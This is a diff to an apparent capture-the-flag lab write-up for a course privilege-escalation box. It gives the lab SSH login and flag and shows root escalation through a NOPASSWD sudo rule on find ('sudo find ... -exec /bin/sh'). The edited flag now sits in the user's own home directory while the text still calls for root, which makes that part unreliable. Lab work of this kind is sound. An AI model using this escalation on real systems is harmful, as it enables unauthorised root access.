@@ -2,7 +2,7 @@
 
 The final box in my column. Isaac's RE hands the player a login,
 **`fieldtech` / `FieldT3ch_2874`**, and they SSH into this host as that low-priv
-user. Goal: become **root** and read the final flag at `/root/flag`.
+user. Goal: become **root** and read the final flag at `/home/fieldtech/disarm-authorization.txt`.
 
 **Flag:** `CITS3006{xyOTpUwAhd}` (the column's root / disarm flag)
 
@@ -32,9 +32,9 @@ root too (this is the standard GTFOBins technique for `find`):
 ```bash
 sudo find . -maxdepth 0 -exec /bin/sh \;
 # id  -> uid=0(root)
-cat /root/flag                # final flag
+cat /home/fieldtech/disarm-authorization.txt                # final flag
 ```
-(Or read it directly in one line: `sudo find . -maxdepth 0 -exec cat /root/flag \;`.)
+(Or read it directly in one line: `sudo find . -maxdepth 0 -exec cat /home/fieldtech/disarm-authorization.txt \;`.)
 
 ## Why it works
 `find`'s `-exec` runs a program, and sudo has launched `find` with the identity of
@@ -56,7 +56,7 @@ docker compose up --build
 ssh fieldtech@localhost -p 2022     # password: FieldT3ch_2874
 sudo -l                              # see the NOPASSWD find rule
 sudo find . -maxdepth 0 -exec /bin/sh \;   # -> root
-cat /root/flag
+cat /home/fieldtech/disarm-authorization.txt
 ```
 The SSH login IS the handoff: in the full chain, Isaac's RE is what reveals the
 `fieldtech` credential, so a player can only reach this box by finishing his stage.
@@ -64,6 +64,6 @@ The SSH login IS the handoff: in the full chain, Isaac's RE is what reveals the
 ## Handoff notes (for the team)
 - **From Isaac:** his RE's payoff is the login **`fieldtech` / `FieldT3ch_2874`**
   (unchanged, the switch from PATH hijack to sudo misconfig did NOT change the SSH
-  credential). Nothing to re-coordinate with him.
-- **To the bomb:** reading `/root/flag` as root is this column's contribution to
+  credential). 
+- **To the bomb:** reading `/home/fieldtech/disarm-authorization.txt` as root is this column's contribution to
   `CITS3006{FINAL_FLAG}`, bomb disarmed.
